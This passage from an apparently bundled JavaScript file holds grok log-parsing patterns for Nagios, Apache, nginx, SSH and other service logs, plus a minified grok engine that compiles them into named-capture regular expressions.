NAGIOS_SERVICE_ALERT %{NAGIOS_TYPE_SERVICE_ALERT:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{DATA:nagios_statelevel};%{NUMBER:nagios_attempt};%{GREEDYDATA:nagios_message}
NAGIOS_HOST_ALERT %{NAGIOS_TYPE_HOST_ALERT:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_state};%{DATA:nagios_statelevel};%{NUMBER:nagios_attempt};%{GREEDYDATA:nagios_message}

NAGIOS_SERVICE_FLAPPING_ALERT %{NAGIOS_TYPE_SERVICE_FLAPPING_ALERT:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{GREEDYDATA:nagios_message}
NAGIOS_HOST_FLAPPING_ALERT %{NAGIOS_TYPE_HOST_FLAPPING_ALERT:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_state};%{GREEDYDATA:nagios_message}

NAGIOS_SERVICE_DOWNTIME_ALERT %{NAGIOS_TYPE_SERVICE_DOWNTIME_ALERT:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{GREEDYDATA:nagios_comment}
NAGIOS_HOST_DOWNTIME_ALERT %{NAGIOS_TYPE_HOST_DOWNTIME_ALERT:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_state};%{GREEDYDATA:nagios_comment}

NAGIOS_PASSIVE_SERVICE_CHECK %{NAGIOS_TYPE_PASSIVE_SERVICE_CHECK:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{GREEDYDATA:nagios_comment}
NAGIOS_PASSIVE_HOST_CHECK %{NAGIOS_TYPE_PASSIVE_HOST_CHECK:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_state};%{GREEDYDATA:nagios_comment}

NAGIOS_SERVICE_EVENT_HANDLER %{NAGIOS_TYPE_SERVICE_EVENT_HANDLER:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{DATA:nagios_statelevel};%{DATA:nagios_event_handler_name}
NAGIOS_HOST_EVENT_HANDLER %{NAGIOS_TYPE_HOST_EVENT_HANDLER:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_state};%{DATA:nagios_statelevel};%{DATA:nagios_event_handler_name}

NAGIOS_TIMEPERIOD_TRANSITION %{NAGIOS_TYPE_TIMEPERIOD_TRANSITION:nagios_type}: %{DATA:nagios_service};%{DATA:nagios_unknown1};%{DATA:nagios_unknown2}

####################
#### External checks
####################

#Disable host & service check
NAGIOS_EC_LINE_DISABLE_SVC_CHECK %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_DISABLE_SVC_CHECK:nagios_command};%{DATA:nagios_hostname};%{DATA:nagios_service}
NAGIOS_EC_LINE_DISABLE_HOST_CHECK %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_DISABLE_HOST_CHECK:nagios_command};%{DATA:nagios_hostname}

#Enable host & service check
NAGIOS_EC_LINE_ENABLE_SVC_CHECK %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_ENABLE_SVC_CHECK:nagios_command};%{DATA:nagios_hostname};%{DATA:nagios_service}
NAGIOS_EC_LINE_ENABLE_HOST_CHECK %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_ENABLE_HOST_CHECK:nagios_command};%{DATA:nagios_hostname}

#Process host & service check
NAGIOS_EC_LINE_PROCESS_SERVICE_CHECK_RESULT %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_PROCESS_SERVICE_CHECK_RESULT:nagios_command};%{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{GREEDYDATA:nagios_check_result}
NAGIOS_EC_LINE_PROCESS_HOST_CHECK_RESULT %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_PROCESS_HOST_CHECK_RESULT:nagios_command};%{DATA:nagios_hostname};%{DATA:nagios_state};%{GREEDYDATA:nagios_check_result}

#Disable host & service notifications
NAGIOS_EC_LINE_DISABLE_HOST_SVC_NOTIFICATIONS %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_DISABLE_HOST_SVC_NOTIFICATIONS:nagios_command};%{GREEDYDATA:nagios_hostname}
NAGIOS_EC_LINE_DISABLE_HOST_NOTIFICATIONS %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_DISABLE_HOST_NOTIFICATIONS:nagios_command};%{GREEDYDATA:nagios_hostname}
NAGIOS_EC_LINE_DISABLE_SVC_NOTIFICATIONS %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_DISABLE_SVC_NOTIFICATIONS:nagios_command};%{DATA:nagios_hostname};%{GREEDYDATA:nagios_service}

#Enable host & service notifications
NAGIOS_EC_LINE_ENABLE_HOST_SVC_NOTIFICATIONS %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_ENABLE_HOST_SVC_NOTIFICATIONS:nagios_command};%{GREEDYDATA:nagios_hostname}
NAGIOS_EC_LINE_ENABLE_HOST_NOTIFICATIONS %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_ENABLE_HOST_NOTIFICATIONS:nagios_command};%{GREEDYDATA:nagios_hostname}
NAGIOS_EC_LINE_ENABLE_SVC_NOTIFICATIONS %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_ENABLE_SVC_NOTIFICATIONS:nagios_command};%{DATA:nagios_hostname};%{GREEDYDATA:nagios_service}

#Schedule host & service downtime
NAGIOS_EC_LINE_SCHEDULE_HOST_DOWNTIME %{NAGIOS_TYPE_EXTERNAL_COMMAND:nagios_type}: %{NAGIOS_EC_SCHEDULE_HOST_DOWNTIME:nagios_command};%{DATA:nagios_hostname};%{NUMBER:nagios_start_time};%{NUMBER:nagios_end_time};%{NUMBER:nagios_fixed};%{NUMBER:nagios_trigger_id};%{NUMBER:nagios_duration};%{DATA:author};%{DATA:comment}

#End matching line
NAGIOSLOGLINE %{NAGIOSTIME} (?:%{NAGIOS_WARNING}|%{NAGIOS_CURRENT_SERVICE_STATE}|%{NAGIOS_CURRENT_HOST_STATE}|%{NAGIOS_SERVICE_NOTIFICATION}|%{NAGIOS_HOST_NOTIFICATION}|%{NAGIOS_SERVICE_ALERT}|%{NAGIOS_HOST_ALERT}|%{NAGIOS_SERVICE_FLAPPING_ALERT}|%{NAGIOS_HOST_FLAPPING_ALERT}|%{NAGIOS_SERVICE_DOWNTIME_ALERT}|%{NAGIOS_HOST_DOWNTIME_ALERT}|%{NAGIOS_PASSIVE_SERVICE_CHECK}|%{NAGIOS_PASSIVE_HOST_CHECK}|%{NAGIOS_SERVICE_EVENT_HANDLER}|%{NAGIOS_HOST_EVENT_HANDLER}|%{NAGIOS_TIMEPERIOD_TRANSITION}|%{NAGIOS_EC_LINE_DISABLE_SVC_CHECK}|%{NAGIOS_EC_LINE_ENABLE_SVC_CHECK}|%{NAGIOS_EC_LINE_DISABLE_HOST_CHECK}|%{NAGIOS_EC_LINE_ENABLE_HOST_CHECK}|%{NAGIOS_EC_LINE_PROCESS_HOST_CHECK_RESULT}|%{NAGIOS_EC_LINE_PROCESS_SERVICE_CHECK_RESULT}|%{NAGIOS_EC_LINE_SCHEDULE_HOST_DOWNTIME}|%{NAGIOS_EC_LINE_DISABLE_HOST_SVC_NOTIFICATIONS}|%{NAGIOS_EC_LINE_ENABLE_HOST_SVC_NOTIFICATIONS}|%{NAGIOS_EC_LINE_DISABLE_HOST_NOTIFICATIONS}|%{NAGIOS_EC_LINE_ENABLE_HOST_NOTIFICATIONS}|%{NAGIOS_EC_LINE_DISABLE_SVC_NOTIFICATIONS}|%{NAGIOS_EC_LINE_ENABLE_SVC_NOTIFICATIONS})
# === httpd / apache ===
QS %{QUOTEDSTRING}
HTTPDUSER %{IPORHOST}|%{USER}
HTTP_REQUEST_LINE (?:%{WORD:verb} %{NOTSPACE:request}(?: HTTP/%{NUMBER:httpversion})?|%{DATA:rawrequest})
COMMONAPACHELOG %{IPORHOST:clientip} %{HTTPDUSER:ident} %{HTTPDUSER:auth} \\[%{HTTPDATE:timestamp}\\] "(?:%{HTTP_REQUEST_LINE}|-)" %{INT:response} (?:%{INT:bytes}|-)
COMBINEDAPACHELOG %{COMMONAPACHELOG} %{QS:referrer} %{QS:agent}

# Apache error log (Apache 2.4+ format)
# [Mon Jan 01 00:00:00.000000 2021] [module:severity] [pid 1234:tid 1234] [client 1.2.3.4:12345] message
# or old format: [Mon Jan 01 00:00:00 2021] [error] [client 1.2.3.4] message
APACHE_ERROR_TIME %{DAY} %{MONTH} %{MONTHDAY} %{TIME}(?:\\.\\d+)? %{YEAR}
APACHE_ERROR_CLIENTIP %{IPORHOST:client}(?::%{POSINT:client_port})?
APACHE_ERROR_MODULE %{WORD:module}(?::%{LOGLEVEL:level})?
HTTPD24_ERRORLOG \\[%{APACHE_ERROR_TIME:timestamp}\\] \\[%{APACHE_ERROR_MODULE}\\] (?:\\[pid %{INT:pid}(?::tid %{INT:tid})?\\] )?(?:file %{NOTSPACE:file}, line %{INT:file_line}, )?(?:\\[client %{APACHE_ERROR_CLIENTIP}\\] )?%{GREEDYDATA:message}
HTTPD20_ERRORLOG \\[%{APACHE_ERROR_TIME:timestamp}\\] \\[%{LOGLEVEL:level}\\] (?:\\[client %{APACHE_ERROR_CLIENTIP}\\] )?%{GREEDYDATA:message}
HTTPD_ERRORLOG %{HTTPD24_ERRORLOG}|%{HTTPD20_ERRORLOG}

# === nginx ===
NGUSERNAME [a-zA-Z\\.\\@\\-\\+_%]+
NGUSER %{NGUSERNAME}

# '$remote_addr - $remote_user [$time_local] '
#                    '"$request" $status $body_bytes_sent '
#                    '"$http_referer" "$http_user_agent"';

# 127.0.0.1 - - [28/Jan/2016:14:19:36 +0300] "GET /zero.html HTTP/1.1" 200 398 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"

NOTDQUOTE [^"]*
DAY2 \\d{2}

#NGINXERRTIME %{YEAR:year}/%{MONTHNUM2:month}/%{DAY2:day} %{HOUR:hour}:%{MINUTE:minute}:%{SECOND:second}
NGINXERRTIME %{YEAR}/%{MONTHNUM2}/%{DAY2} %{HOUR}:%{MINUTE}:%{SECOND}

NGINXACCESS %{IPORHOST:remote_addr} - %{NGUSER:remote_user} \\[%{HTTPDATE:time_local}\\] "%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:http_version}" %{NUMBER:status} %{NUMBER:body_bytes_sent} "%{NOTDQUOTE:http_referer}" "%{NOTDQUOTE:http_user_agent}"

# YYYY/MM/DD HH:MM:SS [LEVEL] PID#TID: *CID MESSAGE
NGINXERROR %{NGINXERRTIME:time} \\[%{LOGLEVEL:loglevel}\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\*%{NONNEGINT:cid} )?%{GREEDYDATA:message}

# === paths ===

#DIR ^.*/
#FILE [^/].*$

#URI_SPLIT ^%{GREEDYDATA:request}\\?%{GREEDYDATA:http_args}$
#FULLPATH_SPLITTER %{DIR:prefix_directory}%{FILE:file_name}


NAXSI_FMT ^NAXSI_FMT: ip=%{IPORHOST:src_ip}&server=%{IPORHOST:target_ip}&uri=%{PATH:http_path}&learning=\\d&vers=%{DATA:naxsi_version}&total_processed=\\d+&total_blocked=\\d+&block=\\d+(&cscore\\d=%{WORD:score_label}&score\\d=%{INT:score})+&zone0=%{WORD:zone}
#^NAXSI_FMT: ip=%{IPORHOST:src_ip}&server=%{IPORHOST:target_ip}&uri=%{PATH:http_path}&learning=\\d&vers=%{DATA:naxsi_version}&total_processed=\\d+&total_blocked=\\d+&block=\\d+(&cscore\\d=%{WORD:score_label}&score\\d=%{INT:score})+&cscore2
#^NAXSI_FMT: ip=%{IPORHOST:src_ip}&server=%{IPORHOST:target_ip}&uri=%{PATH:http_path}(&cscore\\d=%{WORD:score_label}&score\\d=%{INT:score})+&cscore2
#^NAXSI_FMT: ip=%{IPORHOST:src_ip}&server=%{IPORHOST:target_ip}&uri=%{PATH:http_path}&learning=\\d&vers=%{DATA:naxsi_version}&total_processed=\\d+&total_blocked=\\d+&block=\\d+(&cscore\\d=%{WORD:score_label}&score\\d=%{INT:score})+&cscore2

NAXSI_EXLOG ^NAXSI_EXLOG: ip=%{IPORHOST:naxsi_src_ip}&server=%{IPORHOST:naxsi_dst_ip}&uri=%{PATH:http_path}&id=%{INT:naxsi_id}&zone=%{WORD:naxsi_zone}&var_name=%{DATA:naxsi_var_name}&content=

# === postgresql ===
# Default postgresql pg_log format pattern
POSTGRESQL %{DATESTAMP:timestamp} %{TZ} %{DATA:user_id} %{GREEDYDATA:connection_id} %{POSINT:pid}
# === rails ===
RUUID \\s{32}
# rails controller with action
RAILS_CONSTROLLER [^#]+
RAIL_ACTION \\w+
RCONTROLLER %{RAILS_CONSTROLLER:controller}#%{RAIL_ACTION:action}

# this will often be the only line:
RAILS_TIMESTAMP %{YEAR}-%{MONTHNUM}-%{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND} %{ISO8601_TIMEZONE}
RAILS3HEAD (?m)Started %{WORD:verb} "%{URIPATHPARAM:request}" for %{IPORHOST:clientip} at %{RAILS_TIMESTAMP:timestamp}
# for some a strange reason, params are stripped of {} - not sure that's a good idea.
RPROCESSING \\W*Processing by %{RCONTROLLER} as %{NOTSPACE:format}(?:\\W*Parameters: {%{DATA:params}}\\W*)?
RAILS3PROFILE (?:\\(Views: %{NUMBER:viewms}ms \\| ActiveRecord: %{NUMBER:activerecordms}ms|\\(ActiveRecord: %{NUMBER:activerecordms}ms)?
RAILS3FOOT Completed %{NUMBER:response}%{DATA} in %{NUMBER:totalms}ms %{RAILS3PROFILE}%{GREEDYDATA}

RAILS_CONTEXT (?:%{DATA}\\n)*

# putting it all together
RAILS3 %{RAILS3HEAD}(?:%{RPROCESSING})?%{RAILS_CONTEXT:context}(?:%{RAILS3FOOT})?
# === redis ===

#
# Format 1:
#
# [43569] 27 Aug 12:38:58.471 * RDB: 12 MB of memory used by copy-on-write
#

#
# Format 2:
#
# 31493:M 17 Sep 09:02:54.807 # Server started, Redis version 3.0.2
# 31493:M 17 Sep 09:02:54.807 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm$
# 31493:M 17 Sep 09:02:54.807 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.
# 31493:M 17 Sep 09:02:54.807 * DB loaded from disk: 0.000 seconds
# 31493:M 17 Sep 09:02:54.807 * The server is now ready to accept connections on port 6379
#

REDISTIMESTAMP %{MONTHDAY} %{MONTH} %{TIME}
REDISLOG \\[%{POSINT:pid}\\] %{REDISTIMESTAMP:time} \\*\\s
REDISLOG1 %{REDISLOG}
REDISLOG2 %{POSINT:pid}:M %{REDISTIMESTAMP:time} [*#] %{GREEDYDATA:message}
# === ruby ===
RUBY_LOGLEVEL DEBUG|FATAL|ERROR|WARN|INFO
RUBY_LOGGER [DFEWI], \\[%{TIMESTAMP_ISO8601:timestamp} #%{POSINT:pid}\\] *%{RUBY_LOGLEVEL:loglevel} -- +%{DATA:progname}: %{GREEDYDATA:message}
# === smb ===
SMB_AUTH_FAIL Auth:%{GREEDYDATA} user \\[%{DATA:smb_domain}\\]\\\\\\[%{DATA:user}\\]%{GREEDYDATA} status \\[NT_STATUS_NO_SUCH_USER\\]%{GREEDYDATA} remote host \\[ipv4:%{IP:ip_source}
# === ssh ===
# sshd grok pattern

# Start/Stop
SSHD_LISTEN         Server listening on %{IP:sshd_listen_ip} port %{NUMBER:sshd_listen_port}.
SSHD_TERMINATE      Received signal %{NUMBER:sshd_signal}; terminating.

# SSH Tunnel
SSHD_TUNN_ERR1      error: connect_to %{IP:sshd_listen_ip} port %{NUMBER:sshd_listen_port}: failed.
SSHD_TUNN_ERR2      error: channel_setup_fwd_listener: cannot listen to port: %{NUMBER:sshd_listen_port}
SSHD_TUNN_ERR3      error: bind: Address already in use
SSHD_TUNN_ERR4      error: channel_setup_fwd_listener_tcpip: cannot listen to port: %{NUMBER:sshd_listen_port}
SSHD_TUNN_TIMEOUT   Timeout, client not responding.

# Normal
SSHD_SUCCESS        Accepted %{WORD:sshd_auth_type} for %{USERNAME:sshd_user} from %{IP:sshd_client_ip} port %{NUMBER:sshd_port} %{WORD:sshd_protocol}: %{GREEDYDATA:sshd_cipher}
SSHD_DISCONNECT     Received disconnect from %{IP:sshd_client_ip} port %{NUMBER:sshd_port}:%{NUMBER:sshd_disconnect_code}: %{GREEDYDATA:sshd_disconnect_status}
SSHD_CONN_CLOSE     Connection closed by %{IP:sshd_client_ip}$
SSHD_SESSION_OPEN   pam_unix\\(sshd:session\\): session opened for user %{USERNAME:sshd_user} by \\(uid=\\d+\\)
SSHD_SESSION_CLOSE  pam_unix\\(sshd:session\\): session closed for user %{USERNAME:sshd_user}
SSHD_SESSION_FAIL   pam_systemd\\(sshd:session\\): Failed to release session: %{GREEDYDATA:sshd_disconnect_status}
SSHD_LOGOUT_ERR     syslogin_perform_logout: logout\\(\\) returned an error

# Probe
SSHD_REFUSE_CONN    refused connect from %{DATA:sshd_client_hostname} \\(%{IPORHOST:sshd_client_ip}\\)
SSHD_TCPWRAP_FAIL1  warning: %{DATA:sshd_tcpd_file}, line %{NUMBER}: can't verify hostname: getaddrinfo\\(%{DATA:sshd_paranoid_hostname}, %{DATA:sshd_sa_family}\\) failed
SSHD_TCPWRAP_FAIL2  warning: %{DATA:sshd_tcpd_file}, line %{NUMBER}: host name/address mismatch: %{IPORHOST:sshd_client_ip} != %{HOSTNAME:sshd_paranoid_hostname}
SSHD_TCPWRAP_FAIL3  warning: %{DATA:sshd_tcpd_file}, line %{NUMBER}: host name/name mismatch: %{HOSTNAME:sshd_paranoid_hostname_1} != %{HOSTNAME:sshd_paranoid_hostname_2}
SSHD_TCPWRAP_FAIL4  warning: %{DATA:sshd_tcpd_file}, line %{NUMBER}: host name/name mismatch: reverse lookup results in non-FQDN %{HOSTNAME:sshd_paranoid_hostname}
SSHD_TCPWRAP_FAIL5  warning: can't get client address: Connection reset by peer
SSHD_FAIL           Failed %{WORD:sshd_auth_type} for %{USERNAME:sshd_invalid_user} from %{IP:sshd_client_ip} port %{NUMBER:sshd_port} %{WORD:sshd_protocol}
SSHD_USER_FAIL      Failed password for invalid user %{USERNAME:sshd_invalid_user} from %{IP:sshd_client_ip} port %{NUMBER:sshd_port} %{WORD:sshd_protocol}
SSHD_INVAL_USER     Invalid user\\s*%{USERNAME:sshd_invalid_user}? from %{IP:sshd_client_ip}

# preauth
SSHD_DISC_PREAUTH   Disconnected from %{IP:sshd_client_ip} port %{NUMBER:sshd_port}\\s*(?:\\[%{GREEDYDATA:sshd_privsep}\\]|)
SSHD_MAXE_PREAUTH   error: maximum authentication attempts exceeded for (?:invalid user |)%{USERNAME:sshd_invalid_user} from %{IP:sshd_client_ip} port %{NUMBER:sshd_port} %{WORD:sshd_protocol}\\s*(?:\\[%{GREEDYDATA:sshd_privsep}\\]|)
SSHD_DISR_PREAUTH   Disconnecting: %{GREEDYDATA:sshd_disconnect_status} \\[%{GREEDYDATA:sshd_privsep}\\]
SSHD_INVA_PREAUTH   input_userauth_request: invalid user %{USERNAME:sshd_invalid_user}?\\s*(?:\\[%{GREEDYDATA:sshd_privsep}\\]|)
SSHD_REST_PREAUTH   Connection reset by %{IP:sshd_client_ip} port %{NUMBER:sshd_port}\\s*(?:\\[%{GREEDYDATA:sshd_privsep}\\]|)
SSHD_CLOS_PREAUTH   Connection closed by %{IP:sshd_client_ip} port %{NUMBER:sshd_port}\\s*(?:\\[%{GREEDYDATA:sshd_privsep}\\]|)
SSHD_FAIL_PREAUTH   fatal: Unable to negotiate with %{IP:sshd_client_ip} port %{NUMBER:sshd_port}:\\s*%{GREEDYDATA:sshd_disconnect_status}? \\[%{GREEDYDATA:sshd_privsep}\\]
SSHD_FAI2_PREAUTH   fatal: %{GREEDYDATA:sshd_fatal_status}: Connection from %{IP:sshd_client_ip} port %{NUMBER:sshd_port}:\\s*%{GREEDYDATA:sshd_disconnect_status}? \\[%{GREEDYDATA:sshd_privsep}\\]
SSHD_BADL_PREAUTH   Bad packet length %{NUMBER:sshd_packet_length}. \\[%{GREEDYDATA:sshd_privsep}\\]

# Corrupted
SSHD_IDENT_FAIL     Did not receive identification string from %{IP:sshd_client_ip}
SSHD_MAPB_FAIL      Address %{IP:sshd_client_ip} maps to %{HOSTNAME:sshd_client_hostname}, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
SSHD_RMAP_FAIL      reverse mapping checking getaddrinfo for %{HOSTNAME:sshd_client_hostname} \\[%{IP:sshd_client_ip}\\] failed - POSSIBLE BREAK-IN ATTEMPT!
SSHD_TOOMANY_AUTH   Disconnecting: Too many authentication failures for %{USERNAME:sshd_invalid_user}
SSHD_CORRUPT_MAC    Corrupted MAC on input
SSHD_PACKET_CORRUPT Disconnecting: Packet corrupt
SSHD_BAD_VERSION    Bad protocol version identification '%{GREEDYDATA}' from %{IP:sshd_client_ip}

####
SSHD_INIT       %{SSHD_LISTEN}|%{SSHD_TERMINATE}
SSHD_TUNN       %{SSHD_TUNN_ERR1}|%{SSHD_TUNN_ERR2}|%{SSHD_TUNN_ERR3}|%{SSHD_TUNN_ERR4}|%{SSHD_TUNN_TIMEOUT}
SSHD_NORMAL_LOG %{SSHD_SUCCESS}|%{SSHD_DISCONNECT}|%{SSHD_CONN_CLOSE}|%{SSHD_SESSION_OPEN}|%{SSHD_SESSION_CLOSE}|%{SSHD_SESSION_FAIL}|%{SSHD_LOGOUT_ERR}
SSHD_PROBE_LOG  %{SSHD_REFUSE_CONN}|%{SSHD_TCPWRAP_FAIL1}|%{SSHD_TCPWRAP_FAIL2}|%{SSHD_TCPWRAP_FAIL3}|%{SSHD_TCPWRAP_FAIL4}|%{SSHD_TCPWRAP_FAIL5}|%{SSHD_FAIL}|%{SSHD_USER_FAIL}|%{SSHD_INVAL_USER}
SSHD_PREAUTH    %{SSHD_DISC_PREAUTH}|%{SSHD_MAXE_PREAUTH}|%{SSHD_DISR_PREAUTH}|%{SSHD_INVA_PREAUTH}|%{SSHD_REST_PREAUTH}|%{SSHD_FAIL_PREAUTH}|%{SSHD_CLOS_PREAUTH}|%{SSHD_FAI2_PREAUTH}|%{SSHD_BADL_PREAUTH}
SSHD_CORRUPTED  %{SSHD_IDENT_FAIL}|%{SSHD_MAPB_FAIL}|%{SSHD_RMAP_FAIL}|%{SSHD_TOOMANY_AUTH}|%{SSHD_CORRUPT_MAC}|%{SSHD_PACKET_CORRUPT}|%{SSHD_BAD_VERSION}
SSHD_LOG        %{SSHD_INIT}|%{SSHD_NORMAL_LOG}|%{SSHD_PROBE_LOG}|%{SSHD_CORRUPTED}|%{SSHD_TUNN}|%{SSHD_PREAUTH}

# === tcpdump ===
TCPDUMP_OUTPUT %{GREEDYDATA:timestamp} IP %{IPORHOST:source_ip}\\.%{INT:source_port} > %{IPORHOST:dest_ip}\\.%{INT:dest_port}: Flags \\[%{GREEDYDATA:tcpflags}\\], seq


`;class hi{constructor(){this.patterns=new Map,this.compiled=new Map,this.loadBuiltins()}loadPatternText(r){for(const n of r.split(`
`)){const i=n.trim();if(!i||i.startsWith("#"))continue;const t=i.search(/\s/);if(t===-1)continue;const o=i.slice(0,t),s=i.slice(t).trim();this.patterns.set(o,s)}}addPattern(r,n){this.patterns.set(r,n),this.compiled.clear()}compile(r){const n=this.compiled.get(r);if(n)return n;const i=this.buildRegex(r);return this.compiled.set(r,i),i}buildRegex(r){const n=new Map,i=this.expandWithCaptures(r,0,n);try{return new RegExp(i,"s")}catch(t){return console.warn(`Grok compile error for pattern "${r}":`,t),/(?!)/}}expandWithCaptures(r,n,i){if(n>20)return".*?";let t="",o=0;for(;o<r.length;){const s=r.indexOf("%{",o);if(s===-1){t+=this.escapeNonGrok(r.slice(o));break}t+=this.escapeNonGrok(r.slice(o,s));const a=r.indexOf("}",s);if(a===-1){t+=this.escapeNonGrok(r.slice(s));break}const c=r.slice(s+2,a).split(":"),u=c[0],A=c[1],p=this.patterns.get(u)??".*?",_=this.expandWithCaptures(p,n+1,i);if(A){const d=A.replace(/[^a-zA-Z0-9_]/g,"_"),E=i.get(d)??0;i.set(d,E+1);const S=E===0?d:`${d}__${E}`;t+=`(?<${S}>${_})`}else t+=`(?:${_})`;o=a+1}return t}escapeNonGrok(r){return r}match(r,n){const t=this.compile(r).exec(n);return t?Ze(t.groups??{}):null}matchRegex(r,n){const i=r.exec(n);return i?Ze(i.groups??{}):null}loadBuiltins(){this.loadPatternText(`
USERNAME [a-zA-Z0-9._-]+
USER %{USERNAME}
INT (?:[+-]?(?:[0-9]+))
BASE10NUM (?:[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))
NUMBER (?:%{BASE10NUM})
BASE16NUM (?:0[xX]?[0-9a-fA-F]+)
BASE16FLOAT (?:[+-]?(?:0x)?(?:(?:[0-9a-fA-F]+(?:\\.[0-9a-fA-F]*)?)|(?:\\.[0-9a-fA-F]+)))
POSINT \\b(?:[1-9][0-9]*)\\b
NONNEGINT \\b(?:[0-9]+)\\b
WORD \\b\\w+\\b
NOTSPACE \\S+
SPACE \\s*
DATA .*?
GREEDYDATA .*
QUOTEDSTRING "(?:[^"\\\\]|\\\\.)*"
NOTDQUOTE [^"]*
UUID [A-Fa-f0-9]{8}-(?:[A-Fa-f0-9]{4}-){3}[A-Fa-f0-9]{12}
BOOL (?:true|false)
LOGLEVEL (?:[Aa]lert|ALERT|[Tt]race|TRACE|[Dd]ebug|DEBUG|[Nn]otice|NOTICE|[Ii]nfo|INFO|[Ww]arning|WARNING|[Ee]rror|ERROR|[Cc]ritical|CRITICAL|[Ff]atal|FATAL|[Ss]evere|SEVERE|[Ee]merg|EMERG)
# Networking
CISCOMAC (?:[A-Fa-f0-9]{4}\\.){2}[A-Fa-f0-9]{4}
WINDOWSMAC (?:[A-Fa-f0-9]{2}-){5}[A-Fa-f0-9]{2}
COMMONMAC (?:[A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}
MAC (?:%{CISCOMAC}|%{WINDOWSMAC}|%{COMMONMAC})
IPV6 (?:(?:[0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(?:[0-9A-Fa-f]{1,4}:){1,7}:|(?:[0-9A-Fa-f]{1,4}:){1,6}:[0-9A-Fa-f]{1,4}|(?:[0-9A-Fa-f]{1,4}:){1,5}(?::[0-9A-Fa-f]{1,4}){1,2}|(?:[0-9A-Fa-f]{1,4}:){1,4}(?::[0-9A-Fa-f]{1,4}){1,3}|(?:[0-9A-Fa-f]{1,4}:){1,3}(?::[0-9A-Fa-f]{1,4}){1,4}|(?:[0-9A-Fa-f]{1,4}:){1,2}(?::[0-9A-Fa-f]{1,4}){1,5}|[0-9A-Fa-f]{1,4}:(?::[0-9A-Fa-f]{1,4}){1,6}|:(?::[0-9A-Fa-f]{1,4}){1,7}|::(?:[fF]{4}(?::0{1,4})?:)?(?:25[0-5]|(?:2[0-4]|1?[0-9])?[0-9])(?:\\.(?:25[0-5]|(?:2[0-4]|1?[0-9])?[0-9])){3}|(?:[0-9A-Fa-f]{1,4}:){1,4}:(?:25[0-5]|(?:2[0-4]|1?[0-9])?[0-9])(?:\\.(?:25[0-5]|(?:2[0-4]|1?[0-9])?[0-9])){3})
IPV4 (?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)
IP (?:%{IPV6}|%{IPV4})
IPORHOST (?:%{IP}|%{HOSTNAME})
HOSTNAME \\b(?:[0-9A-Za-z][0-9A-Za-z-]{0,62})(?:\\.(?:[0-9A-Za-z][0-9A-Za-z-]{0,62}))*\\.?\\b
HOST %{HOSTNAME}
HOSTPORT %{IPORHOST}:%{POSINT}
# Paths
UNIXPATH (?:/[\\w_%!$@:.,+\\-]*)+
WINPATH (?:[A-Za-z]+:|\\\\)(?:\\\\[^\\\\?*]*)+
PATH (?:%{UNIXPATH}|%{WINPATH})
# URIs
URIPROTO [A-Za-z][A-Za-z0-9+\\-.]+
URIHOST %{IPORHOST}(?::%{POSINT})?
URIPATH (?:/[A-Za-z0-9$.+!*'(){},~:;=@#%&_\\-]*)+
URIPARAM \\?[A-Za-z0-9$.+!*'|(){},~@#%&/=:;_?\\-\\[\\]<>]*
URIPATHPARAM %{URIPATH}(?:%{URIPARAM})?
URI %{URIPROTO}://(?:%{USER}(?::[^@]*)?@)?(?:%{URIHOST})?(?:%{URIPATH}(?:%{URIPARAM})?)?
# Dates & times
MONTH \\b(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\\b
MONTHNUM (?:0?[1-9]|1[0-2])
MONTHNUM2 (?:0[1-9]|1[0-2])
MONTHDAY (?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9])
